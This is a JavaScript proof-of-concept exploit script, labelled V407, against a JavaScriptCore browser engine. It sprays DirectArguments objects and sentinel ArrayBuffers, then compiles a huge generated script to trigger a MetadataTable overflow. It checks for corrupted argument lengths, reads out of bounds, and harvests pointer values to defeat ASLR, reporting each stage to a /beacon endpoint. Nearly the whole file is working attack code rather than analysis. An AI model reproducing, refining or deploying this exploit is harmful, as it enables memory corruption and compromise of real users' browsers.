// V407 - DirectArguments sweep WITHOUT pre-map
// V404 showed OOM at BLOB-146MB with 5GB pre-map.
// p142 proved sweep completes (COMPILED-OK) WITHOUT pre-map.
// Hypothesis: sweep writes ~4.3GB through MADV_FREE'd pages, causing
// physical memory to exceed ~1200MB limit. Without pre-map,
// sweep writes to existing marge pages (already committed).
//
// Strategy: spray DirectArguments, spray sentinel ABs, trigger sweep,
// check for m_length corruption. NO pre-map phase.

(function() {
  'use strict';
  var qc = 0;
  function B(m) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V407-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++), false);
      x.send('');
    } catch(e) {}
  }

  B('START');

  // ===== PHASE 1: Spray DirectArguments =====
  // DirectArguments cells live in MarkedSpace (JSCell allocator).
  // Each cell: [JSCell header(8)] [m_length(4)] [padding(4)] [args inline storage]
  // For 7 args: cell = 8 + 4 + 4 + 7*8 = 72 bytes (probably 80-byte size class)
  // m_length at cell+8 (after JSCell header)
  // Inline storage starts at cell+16 (after header + m_length + pad)
  var SPRAY_COUNT = 4000;
  var argStore = [];

  function makeArgs(a, b, c, d, e, f, g) { return arguments; }

  for (var i = 0; i < SPRAY_COUNT; i++) {
    argStore.push(makeArgs(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47));
  }
  B('SPRAY-' + argStore.length);

  // Verify spray
  var sprayOk = 0;
  for (var i = 0; i < argStore.length; i++) {
    if (argStore[i].length === 7) sprayOk++;
  }
  B('SPRAY-OK-' + sprayOk);

  // ===== PHASE 2: Sentinel ArrayBuffer probes =====
  // 100112 bytes = sizeof(LinkingData) + wrapped totalSize = MetadataTable alloc size
  // These go into the same marge size class as the MetadataTable
  var PROBE_COUNT = 30;
  var probeABs = [];
  var probeViews = [];
  var SENTINEL = 0xBE;

  for (var i = 0; i < PROBE_COUNT; i++) {
    var ab = new ArrayBuffer(100112);
    var view = new Uint8Array(ab);
    // Fill with sentinel pattern: BEBEBEBE...
    for (var j = 0; j < view.length; j++) view[j] = SENTINEL;
    probeABs.push(ab);
    probeViews.push(view);
  }
  B('PROBES-' + probeABs.length);

  // ===== PHASE 3: GC to compact MarkedSpace =====
  // Force GC to move DirectArguments cells into denser blocks
  for (var i = 0; i < 10; i++) {
    var tmp = [];
    for (var j = 0; j < 5000; j++) tmp.push({x: j, y: j * 2});
    tmp = null;
  }
  // FinalizationRegistry-triggered GC
  var fr = new FinalizationRegistry(function(){});
  for (var i = 0; i < 100; i++) {
    fr.register({}, 'gc' + i);
  }
  B('GC-DONE');

  // ===== PHASE 4: Build and load IIFE via script tag =====
  // The IIFE triggers MetadataTable overflow during finishCreation.
  // 38,348,816 op_call entries * 112 bytes stride = 4.3GB sweep forward.
  // The sweep DOES NOT call the function (guard: if(window.____xV407)).
  // It only runs finishCreation which initializes metadata entries.
  //
  // Per-entry writes at sweep time:
  //   entry+0..11: zeros (PackedRawSentinelNode)
  //   entry+12: m_slowPathCount = 0xFFFFFFFF
  //   entry+24: m_slowPathCallDestination = thunk code ptr (8B ASLR leak!)
  //   entry+64: bit fields (m_callType = 1)
  //   entry+68: m_bytecodeIndex = sequential index (4B)

  B('BUILD');
  var N = 38348816;
  var calls = '';
  for (var i = 0; i < N; i++) {
    calls += 'a();';
  }
  var code = '(function(a){if(window.____xV407){' + calls + '}})(function(){})';
  B('BLOB-' + Math.round(code.length / 1048576) + 'MB');

  // Use script tag (async load + compile)
  var scriptBlob = new Blob([code], { type: 'application/javascript' });
  var scriptUrl = URL.createObjectURL(scriptBlob);
  var script = document.createElement('script');

  script.onload = function() {
    B('COMPILED-OK');
    URL.revokeObjectURL(scriptUrl);
    calls = null;
    code = null;

    // ===== PHASE 5: Check DirectArguments corruption =====
    checkAll();
  };

  script.onerror = function() {
    B('COMPILE-ERR');
    checkAll();
  };

  script.src = scriptUrl;
  document.head.appendChild(script);

  function checkAll() {
    B('CHECK');

    // 5a: Check sentinel ABs for sweep evidence
    var abHits = 0;
    for (var i = 0; i < probeViews.length; i++) {
      var view = probeViews[i];
      var nonSentinel = 0;
      var sample = '';
      // Check first 128 bytes for any non-sentinel values
      for (var j = 0; j < 128 && j < view.length; j++) {
        if (view[j] !== SENTINEL) {
          nonSentinel++;
          if (sample.length < 64) {
            sample += j + ':' + view[j].toString(16) + ',';
          }
        }
      }
      // Also check offset 68 (m_bytecodeIndex position in 112-byte stride)
      // and offset 24 (thunk pointer) for sweep signatures
      var off24 = view[24] | (view[25] << 8) | (view[26] << 16) | (view[27] << 24);
      var off68 = view[68] | (view[69] << 8) | (view[70] << 16) | (view[71] << 24);
      if (nonSentinel > 0) {
        abHits++;
        B('AB' + i + '-NS' + nonSentinel + '-O24=' + off24.toString(16) + '-O68=' + off68.toString(16));
        if (sample) B('AB' + i + '-S-' + sample);
      }
    }
    B('AB-HITS-' + abHits + '-OF-' + probeViews.length);

    // 5b: Check DirectArguments for m_length corruption
    var corrupted = 0;
    var oobReads = 0;
    var valCorrupt = 0;

    for (var i = 0; i < argStore.length; i++) {
      var args = argStore[i];

      if (args.length !== 7) {
        corrupted++;
        if (corrupted <= 20) {
          B('CORRUPT-' + i + '-LEN-' + args.length);
        }

        // OOB read if length increased
        if (args.length > 7 && args.length < 10000) {
          oobReads++;
          var oobVals = [];
          var readLimit = Math.min(args.length, 30);
          for (var j = 7; j < readLimit; j++) {
            try {
              var val = args[j];
              if (val !== undefined) {
                var vstr;
                if (typeof val === 'number') {
                  vstr = '0x' + (val >>> 0).toString(16);
                } else if (typeof val === 'object' && val !== null) {
                  vstr = 'obj';
                } else {
                  vstr = typeof val;
                }
                oobVals.push(j + ':' + vstr);
              }
            } catch(e) {
              oobVals.push(j + ':ERR');
            }
          }
          if (oobVals.length > 0 && oobReads <= 5) {
            B('OOB-' + i + '-' + oobVals.slice(0, 8).join('|'));
          }
        }
      } else {
        // Check value corruption
        if (args[0] !== 0x41 || args[6] !== 0x47) {
          valCorrupt++;
          if (valCorrupt <= 10) {
            B('VALC-' + i + '-A0=' + args[0] + '-A6=' + args[6]);
          }
        }
      }
    }

    B('RESULT-C' + corrupted + '-OOB' + oobReads + '-VC' + valCorrupt + '-OF' + argStore.length);

    // 5c: If we got OOB reads, try to read pointer-like values
    if (oobReads > 0) {
      for (var i = 0; i < argStore.length && i < 5; i++) {
        var args = argStore[i];
        if (args.length > 7) {
          // Try to detect pointer patterns: values in address-space range
          for (var j = 7; j < Math.min(args.length, 20); j++) {
            try {
              var val = args[j];
              if (typeof val === 'number' && val > 0x1000 && val < 0xFFFFFFFF) {
                B('PTR-' + i + '-' + j + '-0x' + (val >>> 0).toString(16));
              }
            } catch(e) {}
          }
        }
      }
    }

    B('DONE');
  }
})();
